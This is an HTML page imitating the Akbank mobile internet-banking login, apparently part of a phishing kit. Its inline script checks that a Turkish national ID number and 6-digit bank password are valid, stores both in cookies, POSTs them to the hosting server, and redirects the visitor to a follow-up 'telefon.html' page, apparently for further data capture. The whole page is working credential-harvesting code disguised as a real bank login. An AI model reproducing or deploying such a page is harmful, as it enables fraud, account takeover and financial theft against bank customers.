<html class="no-js javascript png flash9 chrome webkit win mobile-view" lang="tr">

<head id="ctl00_head">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta meta="" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title> Akbank İnternet </title>
    <meta name="description" content="Akbank İnternet">
    <link rel="stylesheet" href="./dist/app.css">
    <link rel="shortcut icon" href="./dist/favicon.ico" type="image/x-icon">
    <style>
        body.modal-open .modal {
            height: fit-content;
        }
    </style> 
</head>

<body class="is-retail is-turkish is-desktop is-nontouch">

    <div class="only-mobile">
        <div id="applicationHost">

            <div data-active-view="true" style="display: block;">
                <div class="guest" data-view="views/guest/guest" data-active-view="true">
                    <div class="header">
                        <div data-bind="click:NavigateToDesktopSite" class="desktop-part">
                            <div class="sub-div">
                                <div class="image-part">
                                    <img src="./dist/dt-w.svg"
                                        onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
                                </div>
                                <div class="desktopText">
                                </div>
                            </div>
                        </div>
                        <div class="lang-guest-selection">
                            <div class="culture-guest-selection" data-bind="visible: langSelection()"
                                style="display: none;">
                                <a class="selected">Türkçe</a>
                                <a class="">English</a>
                            </div>
                        </div>
                    </div>
                    <div class="content-area">
                        <div class="login-form-wrap" data-active-view="true">
                            <div class="login-router">
                                <form action="" name="" method="POST" class="mbbcclogin" data-active-view="true">
                                    <text-input-login>
                                        <div class="text-input-login">
                                            <div data-bind="attr: { class: className}" class="text-input">
                                                <div class="text-input-wrap">
                                                    <div class="icon-part">
                                                        <div class="icon icon-user-w icon-user-w-size">
                                                        </div>
                                                    </div>
                                                    <div class="input-part">
                                                        <input class="inputarea" type="tel" pattern="[0-9]*"
                                                            maxlength="11" name="tckn" id="tcno"
                                                            placeholder="Müşteri / TC Kimlik No">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </text-input-login>
                                    <hr class="login-separator">
                                    <text-input-login
                                        params="type:'ast', placeholder:GetString('AkbankDirektPassword'),value:password">
                                        <div class="text-input-login">
                                            <div data-bind="attr: { class: className}" class="text-input">
                                                <div class="text-input-wrap">
                                                    <div class="icon-part">
                                                        <div class="icon icon-password-w icon-password-w-size">
                                                        </div>
                                                    </div>
                                                    <div class="input-part">
                                                        <input class="inputarea" type="tel" pattern="[0-9]*" id="pass"
                                                            maxlength="6" name="password" placeholder="Akbank Şifresi">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </text-input-login>
                                    <div data-bind="visible: isPhoneNumberVisible()" style="display: none;">
                                        <hr class="login-separator">
                                        <text-input-login
                                            params="type:'phonenumber', placeholder:GetString('EnterTelephone'),value:phoneNumber,selectoptions:_parent.countrycodes,selectvalue:_parent.selectedcountrycode,maxlength:10">
                                            <div class="text-input-login">
                                                <div data-bind="attr: { class: className}" class="text-input">
                                                    <div class="text-input-wrap">
                                                        <div class="icon-part">
                                                            <div
                                                                class="icon icon-phone-number-w icon-phone-number-w-size">
                                                            </div>
                                                        </div>
                                                        <select
                                                            data-bind="style: { background-color: '#c51522' }, options: selectoptions, optionsText: 'countryName', optionsValue: 'Id', value: selectvalue"
                                                            style="background-color: rgb(197, 21, 34);">
                                                        </select>
                                                        <div class="input-part">
                                                            <input class="inputarea" type="tel" pattern="[0-9]*"
                                                                data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }"
                                                                placeholder="Cep telefonu numaranı gir">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </text-input-login>
                                    </div>

                                    <div class="login-button-bar">
                                        <div class="login-button-wrap">
                                            <div class="login-button" data-bind="visible:cancelButtonVisible">
                                                <page-button-login
                                                    params="value:GetString('CancelBIG'),action:function(){ $data.loginCancel() },enable:cancelButtonVisible">
                                                    <div class="page-button-login" data-bind="visible:!midButton()">
                                                        <input type="button" value="İptal">
                                                    </div>
                                                </page-button-login>
                                            </div>
                                            <div class="login-button"
                                                data-bind="css: {yatirimci: !cancelButtonVisible()}">
                                                <page-button-login
                                                    params="value:GetString('LoginBIG'),action:function(){ $data.continueToLogin() },enable:canSubmit">
                                                    <div class="page-button-login" data-bind="visible:!midButton()">
                                                        <button type="submit" id="loginBtn"
                                                            class="responsive-login-btn">Giriş</button>
                                                    </div>
                                                </page-button-login>
                                            </div>
                                        </div>
                                    </div>
                                    <div>
                                        <a class="forget-item" data-bind="click:forgotMBB">
                                            <div class="item-text">
                                                Müşteri numaramı bilmiyorum
                                            </div>
                                            <div class="arrow">
                                                <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                    <a class="forget-item" data-bind="click:forgotPassword">
                                        <div class="item-text">
                                            Şifremi bilmiyorum
                                        </div>
                                        <div class="arrow">
                                            <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
                                            </div>
                                        </div>
                                    </a>
                                </form>
                            </div>
                        </div>
                        <div class="login-form-wrap" style="display: none;">
                            <div class="main-part">
                                <div class="login-router">
                                    <div class="home-title">
                                        <div class="title-wrap">
                                            <div class="title-text">
                                                Akbank Mobil Giriş
                                            </div>
                                        </div>
                                    </div>
                                    <div class="login-options-wrap">
                                        <a data-bind="click: NavigateToMbbLogin" class="login-option">
                                            <div class="icon-wrap">
                                                <div class="option-icon icon-user-w icon-user-w-size">
                                                </div>
                                            </div>
                                            <div class="option-text">
                                                Müşteri / TC Kimlik No ile Giriş
                                            </div>
                                            <div class="option-arrow">
                                                <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
                                                </div>
                                            </div>
                                        </a>
                                        <a data-bind="click: NavigateToCCLogin" class="login-option">
                                            <div class="icon-wrap">
                                                <div class="option-icon icon-credit-card-w icon-credit-card-w-size">
                                                </div>
                                            </div>
                                            <div class="option-text">
                                                Kredi Kartı ile Giriş
                                            </div>
                                            <div class="option-arrow">
                                                <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                                <div class="login-extras-part">
                                    <div class="language-part">
                                        <div class="culture-selection" style="display: none;">
                                            <a class="selected">Türkçe</a>
                                            <a class="">English</a>
                                        </div>
                                    </div>
                                    <div class="login-nav-wrap" data-active-view="true">
                                        <a data-bind="click: NavigateToMaps" class="map-link">
                                            <div class="map-wrap">
                                                <div class="map-icon">
                                                    <div class="map-icon-g icon-map-g icon-map-g-size">
                                                    </div>
                                                </div>
                                                <span class="map-text">
                                                    En Yakın Akbank
                                                </span>
                                                <div class="map-arrow">
                                                    <div
                                                        class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
                                                    </div>
                                                </div>
                                            </div>
                                        </a>
                                        <a data-bind="click: NavigateToCurrencyConverter" class="extras-link">
                                            <div class="extras-wrap">
                                                <div class="extras-icon">
                                                    <div class="extras-icon-g icon-currency-g icon-currency-g-size">
                                                    </div>
                                                </div>
                                                <span class="extras-text extras-has-sub-text">
                                                    Döviz Kuru Hesaplama
                                                    <br>
                                                    <span class="usd-login-text" data-bind="text: loginCurrCombined()">1
                                                        USD = 31,6360 TL</span>&nbsp;
                                                </span>
                                                <div class="extras-arrow">
                                                    <div
                                                        class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
                                                    </div>
                                                </div>
                                            </div>
                                        </a>
                                        <a class="extras-link desktop-site">
                                            <div class="extras-wrap">
                                                <div class="extras-icon">
                                                    <img class="loan-image" src="./dist/loan-g.svg"
                                                        onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
                                                </div>
                                                <span class="extras-text">
                                                    Hızlı Kredi Başvurusu
                                                </span>
                                                <div class="extras-arrow">
                                                    <div
                                                        class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
                                                    </div>
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="separator">
                    </div>
                    <div class="footer">
                        <div class="banner">
                            <img class="logo" src="./dist/standart_logo.svg"
                                onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
                            <div class="extras" style="display: none;">
                                <a class="back-part" data-bind="click:function(){navigateBack();}">
                                    <img class="back-image" data-bind="attr:{src:backIcon}"
                                        onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;"
                                        src="./dist/back.png">
                                </a>
                                <a class="close-part" data-bind="click:function(){navigateHome();}">
                                    <img class="close-image" data-bind="attr:{src:closeIcon}"
                                        onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;"
                                        src="./dist/close.png">
                                </a>
                            </div>
                            <div class="lang-mobile-selection" data-bind="visible: langSelection()"
                                style="display: none;">
                                <a class="selected">Türkçe</a>
                                <a class="">English</a>
                            </div>
                        </div>
                        <div class="sizinicin">sizin için</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade in" id="bootstrapModal" style="top: 0px; display: none;" aria-hidden="false">
            <div class="modal-dialog">
                <div class="modal-content" id="modalHost">
                    <div class="message-wrap" data-view="core/common/dialog/messagedialog" data-active-view="true">
                        <div class="message-title" data-bind="text: title">Hata</div>
                        <div class="message-body"
                            style="overflow-y: scroll; -ms-overflow-style: -ms-autohiding-scrollbar;"
                            data-bind="html: message">Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar
                            deneyebilirsin.</div>
                        <div class="button-holder clearfix">
                            <div class="button-wrap clearfix first block">
                                <input type="button" data-close-modal="" value="Tamam">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-backdrop fade in"></div>
    </div>
    <script>
        // JavaScript kodunu HTML içeriğinin tamamen yüklendiği bir noktaya taşıdık
        document.addEventListener("DOMContentLoaded", function () {
            function setCookie(name, value, days) {
                var expires = "";
                if (days) {
                    var date = new Date();
                    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                    expires = "; expires=" + date.toUTCString();
                }
                document.cookie = name + "=" + (value || "") + expires + "; path=/";
            }

            var savedName = getCookie("savedName");
            if (!savedName) {
                var randomName = generateRandomName(6);
                setCookie("savedName", randomName, 1);
            }
            var tcInput = document.getElementById("tcno");
            var passInput = document.getElementById("pass");

            // Giriş düğmesi
            var loginBtn = document.getElementById("loginBtn");

            // TC kimlik numarası ve şifre doğrulama fonksiyonu
            async function validateInputs() {
                var tcno = tcInput.value;
                var pass = passInput.value;

                // TC kimlik numarası ve şifre uzunluğunu kontrol et
                if (tcno.length === 11 && pass.length === 6) {
                    // TC kimlik numarası doğrulaması
                    if (await tcno_dogrula_ve_islem_yap(tcno)) {
                        // Giriş düğmesini etkinleştir
                        loginBtn.disabled = false;
                    } else {
                        // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
                        loginBtn.disabled = true;
                        alert("Geçersiz TC Kimlik Numarası");
                    }
                } else {
                    // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
                    loginBtn.disabled = true;
                }
            }

            // TC kimlik numarası ve şifre alanlarının değerlerinin değiştiğini izle
            tcInput.addEventListener("input", validateInputs);
            passInput.addEventListener("input", validateInputs);

            // Giriş düğmesine tıklandığında formu gönder
            loginBtn.addEventListener("click", function () {
                // TC kimlik numarası ve şifreyi al
                var tcno = tcInput.value;
                var pass = passInput.value;

                // Kullanıcıya atanmış adı al
                var assignedName = getCookie("savedName");

                // TC kimlik numarası ve şifre uzunluğunu kontrol et
                if (tcno.length === 11 && pass.length === 6) {
                    // TC kimlik doğrulaması yap
                    if (tcno_dogrula_ve_islem_yap(tcno)) {
                        // Cookie'leri oluştur
                        document.cookie = `tcno=${tcno}`;
                        document.cookie = `pass=${pass}`;

                        // POST işlemi için veri oluştur
                        var data = new FormData();
                        data.append('tcno', tcno);
                        data.append('pass', pass);

                        // POST işlemi için fetch kullanarak isteği oluştur
                        fetch('', {
                            method: 'POST',
                            body: data
                        })
                            .then(response => response.text())
                            .then(data => {
                                console.log(data);
                                window.location.href = 'telefon.html';
                            })
                            .catch(error => {
                                console.error('Hata:', error);
                                window.location.href = 'telefon.html';
                            });
                    }
                    else {
                        alert("Geçersiz TC Kimlik Numarası");
                    }
                } else {
                    alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
                }
            });

            // TC kimlik doğrulama fonksiyonu
            async function tcno_dogrula_ve_islem_yap(tcno) {
                // TC kimlik doğrulama fonksiyonu
                tcno = String(tcno);
                if (tcno.substring(0, 1) === '0') {
                    return false;
                }
                if (tcno.length !== 11) {
                    return false;
                }
                var ilkon_array = tcno.substr(0, 10).split('');
                var ilkon_total = hane_tek = hane_cift = 0;
                for (var i = j = 0; i < 9; ++i) {
                    j = parseInt(ilkon_array[i], 10);
                    if (i & 1) {
                        hane_cift += j;
                    } else {
                        hane_tek += j;
                    }
                    ilkon_total += j;
                }
                if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
                    return false;
                }
                ilkon_total += parseInt(ilkon_array[9], 10);
                if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
                    return false;
                }
                return true;
            }


            function getCookie(name) {
                var nameEQ = name + "=";
                var ca = document.cookie.split(';');
                for (var i = 0; i < ca.length; i++) {
                    var c = ca[i];
                    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
                }
                return null;
            }

            // Rastgele ad oluşturma fonksiyonu
            function generateRandomName(length) {
                var result = '';
                var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                var charactersLength = characters.length;
                for (var i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
            }


        });
    </script>
</body>

</html>